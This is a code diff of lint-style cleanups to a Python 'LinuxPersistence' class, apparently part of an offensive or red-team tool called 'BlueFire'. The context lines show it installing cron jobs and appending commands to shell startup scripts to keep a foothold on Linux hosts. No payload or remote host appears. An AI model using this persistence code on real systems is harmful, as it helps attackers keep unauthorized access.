@@ -1,10 +1,7 @@
-import os
-import platform
-import subprocess
-import shlex # Import shlex for robust shell argument quoting
-from typing import Dict, Any, Tuple, Optional, List
 import logging
-from pathlib import Path # Use pathlib for cleaner path handling
+import shlex  # Import shlex for robust shell argument quoting
+from pathlib import Path  # Use pathlib for cleaner path handling
+from typing import Any, Dict, List
 
 # Assume logger is passed or configured appropriately
 logger = logging.getLogger(__name__)
@@ -93,7 +90,7 @@ class LinuxPersistence:
                 exec_result_verify = self._execute_command(verify_cmd, capture_output=True)
 
                 if exec_result_verify.get('return_code') == 0:
-                    logger.info(f"Cron job verified successfully in crontab.")
+                    logger.info("Cron job verified successfully in crontab.")
                     status = "success"
                     verification_passed = True
                 else:
@@ -152,7 +149,7 @@ class LinuxPersistence:
         #                   If None, attempts to find and modify common ones.
 
         command = details.get("command")
-        comment = details.get("comment", f"BlueFire Persistence Marker") # Default comment for idempotency
+        comment = details.get("comment", "BlueFire Persistence Marker") # Default comment for idempotency
         target_scripts_names = details.get("target_scripts") # Optional specific list
 
         if not command:
@@ -186,7 +183,6 @@ class LinuxPersistence:
 
         for script_path in scripts_to_modify:
              logger.debug(f"Processing script: {script_path}")
-             status = "failure"
              reason = ""
              try:
                   # Check if marker already exists
@@ -206,7 +202,6 @@ class LinuxPersistence:
                   script_content_after = script_path.read_text(encoding='utf-8', errors='ignore')
                   if check_marker in script_content_after:
                        logger.info(f"Successfully appended command to {script_path}")
-                       status = "success"
                        modified_files.append(str(script_path))
                        overall_status = "success" # Mark overall success if any file is modified
                   else:
@@ -233,4 +228,4 @@ class LinuxPersistence:
             "reason": f"{len(failed_files)} script(s) failed modification." if failed_files else None
         }
 
-    # Add other Linux/macOS specific methods like _handle_systemd_unit, _handle_bashrc etc. here 
+    # Add other Linux/macOS specific methods like _handle_systemd_unit, _handle_bashrc etc. here
